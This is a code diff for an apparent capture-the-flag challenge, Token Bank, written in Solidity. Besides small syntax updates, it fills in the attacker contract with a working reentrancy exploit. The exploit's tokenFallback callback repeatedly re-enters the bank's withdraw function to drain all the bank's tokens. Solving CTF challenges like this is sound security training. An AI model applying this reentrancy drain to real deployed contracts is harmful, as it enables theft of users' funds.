@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import "forge-std/console.sol";
+
 interface ITokenReceiver {
     function tokenFallback(
         address from,
@@ -21,7 +23,7 @@ contract SimpleERC223Token {
 
     event Transfer(address indexed from, address indexed to, uint256 value);
 
-    constructor() public {
+    constructor() {
         balanceOf[msg.sender] = totalSupply;
         emit Transfer(address(0), msg.sender, totalSupply);
     }
@@ -95,7 +97,7 @@ contract TokenBankChallenge {
     mapping(address => uint256) public balanceOf;
     address public player;
 
-    constructor(address _player) public {
+    constructor(address _player) {
         token = new SimpleERC223Token();
         player = _player;
         // Divide up the 1,000,000 tokens, which are all initially assigned to
@@ -111,7 +113,7 @@ contract TokenBankChallenge {
     function tokenFallback(
         address from,
         uint256 value,
-        bytes memory data
+        bytes memory
     ) public {
         require(msg.sender == address(token));
         require(balanceOf[from] + value >= balanceOf[from]);
@@ -136,5 +138,27 @@ contract TokenBankAttacker {
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
     }
-    // Write your exploit functions here
+
+    function tokenFallback(
+        address,
+        uint256,
+        bytes memory
+    ) public {
+        uint256 remainingTokensThis = challenge.balanceOf(address(this));
+        uint256 remainingTokensBank = challenge.token().balanceOf(address(challenge));
+
+        if (remainingTokensThis > 0 && remainingTokensBank > 0) {
+            if (remainingTokensThis > remainingTokensBank) {
+                challenge.withdraw(remainingTokensBank);
+            } else {
+                challenge.withdraw(remainingTokensThis);
+            }
+        }
+    }
+    
+    function exploit(address player) public {
+        challenge.token().transfer(address(challenge), 500_000 * 1 ether);
+        challenge.withdraw(500_000 * 1 ether);
+        challenge.token().transfer(player, 1_000_000 * 1 ether);
+    }
 }
